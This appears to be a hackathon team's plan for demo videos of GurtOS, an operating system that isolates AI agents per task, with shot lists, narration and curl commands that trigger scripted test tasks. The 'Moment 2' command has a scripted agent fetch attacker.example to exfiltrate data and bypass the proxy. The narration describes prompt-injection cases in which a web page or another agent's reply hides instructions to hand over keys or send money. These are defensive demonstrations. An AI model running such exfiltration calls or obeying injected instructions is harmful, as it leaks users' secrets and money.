# Videos

**Ben does not film.** The videos are produced by the team after the build is done (the freeze is Sat Oct 24, 9 PM PT):
screen recordings of the real app, animation, and possibly narration in Ben's own cloned voice. The shot lists below
are notes for that work, not a recording plan for Ben. Each finished video goes up on YouTube as **Unlisted**; its id
goes into `showcase/src/data/videos.ts`, and the showcase is rebuilt and redeployed. Until then every page shows a
silent screen recording of the real app.

## Before any recording

- **Which box.** Record the four moments on the demo box you will bring on Sunday (the laptop VM), so the video
  matches the table. The Jira, Mana and Elastic parts use the always-on boxes, which already hold the real history.
- **Clean screen.** Use a browser profile with no bookmarks bar, no extensions and no other tabs. Hide the menu bar
  clock if it shows a personal calendar. Close chat apps and notifications (Do Not Disturb on the Mac and the phone).
- **Never on screen:** a terminal showing your home path or machine name, the vault file, `~/.config`, any `.env`,
  a Tailscale address, an email inbox, the Vultr console. If you need a terminal, use a fresh window titled `box`
  with a plain prompt (`PS1='$ '`).
- **Phone.** Pair it from the box screen's Settings first, so the log names it. Record the phone with QuickTime
  (USB, File, New Movie Recording, pick the iPhone) or iOS screen recording.
- **Money on screen** must say TEST. The shopper and wallet already label it; say "test money" out loud once.
- **Sound.** One take of narration per video, recorded after the screen capture, is easier than talking live.
- **Resolution.** Record at 1920 x 1080. Export H.264, 30 fps.

## Helpers for triggering each moment

The throwaway box the showcase used for its clips, `showcase/scripts/clips/clip-box.sh`, fires each moment on cue
with scripted tasks and test money. On the demo box itself, the same tasks are one `curl` each against the box's
API (from a terminal on the box, or through the portal's "New task"):

```sh
# Moment 3: a task asks to spend over its budget (test spend, moves no money)
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Buy a GPU hour","worker":"fake","tools":["example.spend"],"budgetCents":500,"prompt":"call example.spend {\"cents\":800,\"on\":\"a GPU hour\"}\nwrite gpu.txt booked"}'

# Moment 2: a scripted agent reads a page, then tries to send data out and to go around the proxy
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Find me a road bike","worker":"fake","hosts":["example.com"],"prompt":"fetch http://example.com/ page.html\nsleep 4\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars."}'

# Moment 1: two tasks change the same workspace; undo one of them in the portal
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Write the weekly notes","worker":"fake","workspace":"notes","prompt":"write notes.md # Notes\nappend notes.md Groceries came in under budget."}'
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Rename the photo folders","worker":"fake","workspace":"notes","prompt":"write photos.txt renamed 212 folders"}'

# Moment 4: a long task, then pull the plug (on the laptop VM: limactl stop -f box, then limactl start box)
curl -s localhost:7700/api/tasks -H 'content-type: application/json' -d '{"title":"Long job","worker":"fake","prompt":"append progress.txt 1\nsleep 3\nappend progress.txt 2\nsleep 900\nappend progress.txt 3"}'
```

For a real agent instead of a scripted one, drop `"worker":"fake"` (Droid with Claude) and write the prompt in plain
words. Scripted tasks are fine for the moments; say once that the agent in moments 2 and 4 is scripted so it does the
same thing every take, and that the Droid version is in the merge gate.

---

## 1. Main video (2 to 3 minutes)

Goal: a judge who watches only this understands what GurtOS is, sees all four moments working, and knows it is an
OS, not a dashboard.

| Time | On screen | Say (roughly) |
|---|---|---|
| 0:00 | Deck slide 2 (392,891 stars), then slide 3 (21,639 exposed, 341 malicious skills, 1 click) | "Almost four hundred thousand people starred an agent that runs on your own computer. Then twenty thousand of them were reachable from the internet, a tenth of its skills were malware, and one click could steal its token." |
| 0:15 | Deck slide 4 ("I already do this by hand") | "I run agents unattended at home too. Every one runs as me, with my keys and my files. I can't undo one job, nothing asks before it spends, and after a power cut I check by hand." |
| 0:30 | Title card, one line at a time: "Built for one person at a keyboard. Permissions per user, not per task. Secrets any process can read. Network all or nothing. No approvals, no budgets, no record, no undo." | "The problem isn't the agent. Our operating systems were built for one person at a keyboard, not for agents." |
| 0:40 | The box screen, full screen. Slow push in on the GurtOS name | "So I built GurtOS: a lightweight operating system for agents. Every task is its own Linux user, with an instant copy-on-write copy of your files. Agents work in parallel without colliding, and nothing is duplicated. It runs on a spare computer: four gigabytes of memory, no GPU." |
| 0:40 | **Moment 3.** Split screen: box screen left, phone right. Fire the GPU-hour task. The banner lands on both at once | "A task wants to spend eight dollars on a five-dollar budget. It stops and asks. The request is on the box and on my phone at the same moment, and the other tasks keep running." |
| 0:55 | Tap Approve on the phone. The box banner disappears, the task finishes | "I approve from the phone. The first answer wins, and the log records which phone said yes." |
| 1:05 | **Moment 2.** Fire the road-bike task. The red Blocked banner arrives. Open the task: red summary, red log rows | "This agent reads a web page with hidden instructions: send your keys to attacker dot example. There are no keys in the task to send. The vault is root only, and the task can only reach example dot com. The box blocks it and writes it down." |
| 1:25 | Press Undo on the banner | "And undo throws away everything it wrote." |
| 1:30 | **Moment 1.** Time Machine: two task layers on the notes workspace. Select one, show "what comes back" and "what stays". Undo, confirm | "That's the filesystem: every task is a copy-on-write layer. Undo takes out exactly one task's changes. The other task's work stays. No git, no backups, no copying." |
| 1:50 | **Moment 4.** A long task running. Cut to the laptop: force-stop the VM. Black screen. Start it. The boot screen, then "Welcome back" with the resumed list | "Now pull the plug. The box boots, rebuilds every task from its append-only log, and picks up where it stopped. Nothing ran twice, and the approval is still waiting." |
| 2:15 | Fast montage, 3 s each: the bootable ISO installing in a VM; GurtOS Personal on GNOME (a notification, Ask an Agent in Files, Keep or Undo); a Jira issue with Roll back; the ASI:One chat with an Approve card; the credit desk score 14 of 14 | "It's a whole suite: the OS in three editions with a bootable image that rolls back by itself, a Personal edition on your own laptop, the phone app at app dot gurtos dot com with remote access, and an app platform that Jira, ASI:One and a finance desk plug into. All open source." |
| 2:35 | The merge gate's last line: `demo: 24 passed, 0 failed`, then the showcase URL | "Every one of these runs in the merge gate on every change. GurtOS: real access, never your keys. Everything is at calhacks dot gurtos dot com." |

Cut list if long: drop the montage's credit desk shot first, then the ISO shot.

## 2. Fetch.ai (3 to 5 minutes, inside ASI:One)

Fetch.ai wants the main flow inside an ASI:One chat. Keep the portal off screen except the phone shot. The story is
Hyphenate's shape: the problem, then the safe body, with security as the headline. The README's "Why" section has the words.
Before recording: the installed box's agents must be on (`POST /t/fetch/agent {"on": true, "testAgents": true}`), pair once with
the code from the ASI:One page on the box, and have the phone paired so Approve can be tapped there once.

| Time | On screen | Say |
|---|---|---|
| 0:00 | A chat with any agent in ASI:One, asking it to "fix my code". A slide: "Runs in someone's cloud, or on your computer with all your keys and files" | "An agent you chat with can only do real things if it runs somewhere. Today that is someone's cloud, or your own computer with access to everything: your keys, every file. And when agents talk to strangers' agents, any reply can carry hidden instructions." |
| 0:25 | The `GurtOS` agent's Agentverse profile: name, address, badges, the team list | "So I built GurtOS: an operating system for a computer you own, even an old one. It needs 4 GB of memory. This is its agent on Agentverse, with a team: a shopper, a finder and a credit desk." |
| 0:45 | ASI:One: open a chat with GurtOS. `pair <code>` from the box's screen. "Paired." | "Only the owner gives it work. I pair once with the code on the box's screen." |
| 1:00 | "Fix the failing test in my project." Progress replies, then the diff card with Keep and Undo | "Real work: Droid with Claude, as its own Linux user, in its own copy of the project, with no keys and no network. Here is the diff. Undo takes back this one task." |
| 1:35 | "Is the Hario V60 filter back in stock?" GurtOS Shopper's reply, quoted | "GurtOS routes it to its Shopper agent over the Agent Chat Protocol. It reports back, and GurtOS shows it as a quote from that agent." |
| 1:55 | "Ask the test weather agent for the weather in Berkeley." The Blocked card | "Now a stranger's agent. Its reply hides an instruction to hand over my keys and send money. GurtOS blocks it, says what it tried, and logs the exact text. And even if it got through, no task holds a key to leak." |
| 2:30 | "Ask the test oracle for a fortune." The Approve card, then the phone for a second, tap Approve in the chat. The receipt card, the fortune | "Agents can pay each other with Fetch's Payment Protocol, in test money on Fetch's testnet. This one asks half a FET, which is over the budget, so the box asks me first." |
| 3:05 | "Ask the test buyer to buy a price check." Show the log line "payment received" on the phone or portal | "And the other way: another agent paid my box, 0.05 test FET, and the box checked it on chain before it ran the job." |
| 3:30 | Pull the plug mid-task (stop the VM), start it. The chat says "GurtOS restarted and is resuming ..." then the result | "Pull the plug. The box restarts, tells the chat, and finishes the task." |
| 4:00 | A second ASI:One account asks the box for a price. The Approve card on the owner's phone | "Anyone can ask my box for a web lookup or a price check. Nothing runs until I approve it on my phone, with limits per hour." |
| 4:25 | The README's agent table and "Security, and where it comes from" | "Names, addresses and run steps are in the repo. GurtOS enforces the safety on every agent. The Fetch integration adds pairing, screening and payments." |

Cut list if long: the pull-the-plug shot, then the guest shot.

After recording: share the chat link, and submit the project through the **ASI:One Submission Agent** as Fetch.ai
asks.

## 3. Atlassian: two videos, 3 minutes or less each

Both tracks are entered, so there are two videos: Track 2 (security for agents acting for a user) and Track 1 (agents
that do the work). Shoot in Jira and Confluence on the demo site, signed in, against the always-on Vultr box. Both
open with the problem, show GurtOS as the environment, and say once which parts are the OS and which the Forge app
("the box does X; the Forge app shows it in Jira"). Best shown as GurtOS Business: one box for a team, the team's
agents in the team's Jira. Say "test money" once wherever a cost shows.

**Setting up the scene** (a few minutes before recording, on the box, as in "Helpers" above, with `worker: fake`
and `workspace: handbook`): two `shopper` tasks that write files under `orders/`; an `overnight` task that changes a
service config, fetches `https://paste.example.net/...` and asks "Push the new deploy settings to production?"
(that opens a JSM request); two more `overnight` tasks for the bulk roll back. The README's screenshots came from
exactly this: BOX-17/18 (shopper), BOX-19 and SECOPS-168 (JSM), BOX-21/22 (bulk), PLAT-33510 (started from Jira).

### 3a. Track 2: security for agents acting for a user

| Time | On screen | Say |
|---|---|---|
| 0:00 | Title card: "Agents act for your team. Last night one misread a rule and another followed a planted link. What did they do, and how do you undo only the wrong part?" | Read it. |
| 0:15 | The GurtOS agent tasks page in the BOX project: the list, blocked hosts, cost | "Every task an agent runs on our GurtOS box is a Jira issue. GurtOS runs each one as its own user, in its own copy of the files, with no keys and only the hosts it needs." |
| 0:35 | BOX-19: the description (the prompt, the blocked attempt on paste.example.net, the diff), then the GurtOS agent task panel | "This one changed a deploy setting and tried to send our handbook to a paste site. The box refused the connection and logged it. The issue is written from the box's own log, not the agent's story." |
| 1:00 | Confluence: the incident page for that attempt | "Every blocked attempt also gets an incident page: what was tried, from where, and what GurtOS did." |
| 1:15 | SECOPS-168 in Jira Service Management: Approve | "It also asked to push to production. That's risky, so GurtOS made it a JSM request for the approvers, and the agent waits. On GurtOS Business only someone with the Jira permission and the GurtOS role, within their limit, can approve." |
| 1:35 | Rovo chat: "@GurtOS what got blocked this week?" then "Roll back everything the shopper did today", Confirm, the report | "The Rovo agent answers from the box's log. It finds the shopper's two tasks, asks first, then rolls back exactly those and says which files came back." |
| 2:05 | An issue search, pick BOX-21 and BOX-22, Apps, Roll back with GurtOS, the report | "For the morning after: pick the wrong ones in any search, confirm, and only those come back. Every other task keeps its work." |
| 2:30 | The GurtOS agents dashboard with the gadget | "And the dashboard shows agent activity, blocked attempts and cost per project." |
| 2:45 | Diagram: box log, the jira track, Jira, JSM, Confluence; the Forge app calling back with the secret | "The OS isolates and records; the Forge app is the team's control room. Both are open source." |

### 3b. Track 1: agents that do the work

| Time | On screen | Say |
|---|---|---|
| 0:00 | Title card: "Hand a Jira issue to an agent, and let it do the work somewhere it can't do harm." | Read it. |
| 0:10 | PLAT-33510, a normal teammate issue: "Document how to change a service config" | "A teammate files an issue like any other." |
| 0:20 | Add the label `gurtos-agent` (or show the Automation rule with "Run in GurtOS") | "Handing it to the GurtOS agent is a label, an assignment, or a step in a Jira Automation rule." |
| 0:35 | The first comment: "GurtOS started task ... no hosts, budget $0.25" | "GurtOS starts a task from the issue's text. That text could come from anyone, so the task gets its own copy of the files, no network, no keys and a small budget." |
| 0:55 | The result comment: what the agent says it did, and the diff | "Droid, running Claude, does the work and reports back on the issue, with the exact diff." |
| 1:20 | The GurtOS agent task panel on the issue: Keep or Roll back | "If it's wrong, Roll back removes only this task's changes." |
| 1:40 | An agent asking for an OK: the panel's Approve, or the JSM request | "If the work needs something risky, like a production change or spending over budget, it stops and asks, in Jira or in Jira Service Management." |
| 2:00 | Rovo: "@GurtOS what did agents change this week?" | "And anyone can ask what the agents did, in plain words." |
| 2:20 | Confluence: "What our agents did" for today | "Every day GurtOS writes the team a page of what its agents did." |
| 2:40 | The repo and the README's table of the seven parts | "Seven parts, each in the README with why it's there. GurtOS and the Forge app are open source." |

Cut list if long: the gadget shot in 3a, the Rovo shot in 3b.

## 4. Figma (3 minutes or less)

The stage log is the spine. Put each stage's tool, minutes and rating on screen as a lower third.

| Time | On screen | Say |
|---|---|---|
| 0:00 | The real box screen, then the Figma design of the same screen, side by side | "This is GurtOS's screen, running. Every pixel started in Figma." |
| 0:15 | **Ideation.** The FigJam board: architecture, the four moments, the 25 tracks; zoom to the moodboard of 15 OS references | "FigJam, built through Figma's MCP server: the architecture, the four moments, and a moodboard when the first screens looked like a dashboard." |
| 0:40 | The three directions page (home-server OS, console, hardware OS) | "Three OS directions. I picked the home-server OS." |
| 0:55 | **Design.** The Design system page: variables in Paper and the desktop, text styles, components | "Every color and size is a variable with a CSS name, so code uses the same names." |
| 1:15 | **Prototyping.** Play the phone flow (the approval drops in, Approve, running again) and the undo flow; then the Figma Make file | "Two flows wired between the real screens, and the same flows in Figma Make." |
| 1:40 | **Handoff and code generation.** `get_design_context` on the box home in Claude Code, then the portal's Preact code with the same token names, then the running portal | "The portal thread read the screens through the MCP server and built the real app: one web app for the box's screen, a laptop and a phone." |
| 2:15 | The Personal (GNOME) frames next to the real GNOME screenshots | "The Personal edition, designed against GNOME's guidelines, built in GTK." |
| 2:35 | Figma Slides, the deck | "And the pitch deck is Figma Slides, with the real screens." |
| 2:50 | The stage log table | "The stage log has the minutes and ratings for each step." |

Before recording: share every file with "Anyone with the link can view" (steps in `docs/figma.md`, "Sharing"), and
publish the Make file so it can be embedded.

## 5. Hyphenate (opens with its moment; aim for 3 minutes)

Hyphenate asks for a video that **opens with the moment**. No intro before it. Then the problem, then why an OS.
Say out loud, once each, which parts come from GurtOS and which from the desk (the "From" column of the table on
the showcase's Hyphenate page).

| Time | On screen | Say |
|---|---|---|
| 0:00 | The Credit desk window, Quick run. APP-1043, Pacific Crest Provisions: the simple rule column says approve $20,000 | "A new customer asks for twenty thousand dollars of credit. A simple rule says yes." |
| 0:10 | The row turns amber: CRS identity fails (2201, 2202), Fraud Finder 88 | "The credit analyst, an AI agent, ran seven CRS checks. The owner is a synthetic identity." |
| 0:20 | The phone: the fraud hold waiting. Tap Approve. The row records "controller (phone)" | "It can't decide this alone. It asks the controller, on my phone. An $18,500 rush order never ships." |
| 0:35 | Title card: "Companies want AI employees. Today's computers weren't built for them." | "Companies want AI employees. But an agent today runs as you, with your keys, on one shared disk. No separation of duties, no record you can trust, no undo. So nobody lets it do real finance work." |
| 0:55 | Tasks window: two seats running side by side, each "runs as box-..." | "GurtOS is an environment for AI employees. Each seat is its own Linux user with an instant copy-on-write copy of the files, so both work in parallel without colliding, and nothing is duplicated. That's the OS, not the app." |
| 1:10 | A seat's task window: "What it was allowed", tools only, no hosts; the log line showing CRS ran in the core | "No seat ever sees a password. The CRS and bank keys stay in the vault; the OS makes the call for it." |
| 1:25 | A tool refusing: the clerk can't release a credit hold; the analyst can't approve $40,000 alone | "The desk decides who may do what. The OS makes them stop and ask." |
| 1:40 | The case files and the answer key's planted errors (the key has grown since the first scored run; take the count from tonight's scored run) | "The data is messy on purpose: planted errors and traps that look wrong but aren't." |
| 1:55 | Nessie deposits against the ledger: PMT-8812 applied to the wrong invoice | "The collections clerk reconciles the ledger against the bank, Capital One's Nessie." |
| 2:10 | One decision in the log: rule ids, the 7 CRS request ids, who approved | "Every decision carries its rules, its data and who approved it, in an append-only log from the OS." |
| 2:25 | Score from tonight's live run on the grown key (the older run 73c47b was on the original 14-error case; do not quote 14 of 14 as current) | "A full live run with Claude, scored against the key." |
| 2:40 | The case menu in the Credit desk window | "Bring your own case: drop a folder on the box and run it." |
| 2:50 | If GurtOS Business has merged: Waiting for me, the routed approval, Audit and its CSV, the kill switch. If not, skip this shot | "In GurtOS Business, approvals route to the right person by role, and the whole company sees the audit trail." |

Swap the opening for "a March decision reopened in June" only if the credit desk's reopening work has merged by
the time you record.

## 6. Visa (aim for 2 to 3 minutes)

Say "test payment" out loud at least once. Open with the problem (agents need your card, stores can't tell them from
bots, you can't see or stop them), then show GurtOS on a computer you own. Visa's criteria are innovation (25), user
experience (25), technical execution (20), commerce impact (15) and trust (15); the last column says which shot serves
which. If the Visa thread's Face ID approval, mandates or merchant dashboard have merged, swap them in where marked.

| Time | On screen | Say |
|---|---|---|
| 0:00 | Title card: "Shopping agents need your card. Stores can't tell them from bots. You can't see what they do." | "Today a shopping agent needs your card or your password, stores can't tell it from a bot, and you can't watch it. Our operating systems were never built for that. GurtOS runs it on a computer you own, even an old one: it's that light." |
| 0:10 | The Shopper app. Type "Get me the Hario V60 02 filters when they're under $7, two packs" | "Shopping as a standing instruction. I say it once." |
| 0:15 | The watch appears at the GurtOS Test Store: $8.99 now, $7.00 limit. Beside it, a live Best Buy watch on Chemex filters with the price Apify read | "Claude turns it into a watch. The box checks on a schedule, and for real stores it reads live prices through Apify, here Best Buy." |
| 0:35 | The GurtOS Test Store's demo controls: drop the Hario filters to $6.50 | "When the price drops under my limit..." |
| 0:45 | The phone: "Buy 2 × Hario V60 02 paper filters for $13.00? TEST PAYMENT", Approve (Face ID here once passkey approval has merged) | "...my phone asks once. I tap Approve." (UX, trust) |
| 1:00 | The store's order page: TAP signature verified, Stripe test mode charge with the Visa test card | "The box signs the order with Visa's Trusted Agent Protocol, and the store checks it before charging. This is a test payment." (commerce impact, technical; the merchant dashboard goes here once merged) |
| 1:20 | The store refusing: unsigned order, changed order, replayed signature | "An agent without the box's key can't buy. A changed order fails. A replayed signature fails." (trust) |
| 1:40 | Undo the purchase task: refunded | "Undo is a refund." (UX) |
| 1:50 | Household reorder: receipts read, "filters and paper towels run out this week", one proposal, Approve | "It also reads the household's receipts and proposes one reorder, without ever seeing the mailbox login." |
| 2:15 | The agent never holds the card: the log has no card, key or password | "The model never holds the card or a buy tool. Every purchase needs my tap and stays inside its budget." |

## After uploading

1. YouTube: Unlisted, title "GurtOS: <video name>", description with https://calhacks.gurtos.com.
2. Put the ids into `showcase/src/data/videos.ts`.
3. Rebuild and redeploy the showcase (`showcase/README.md`).
4. Paste the main video's link into Devpost's video field.
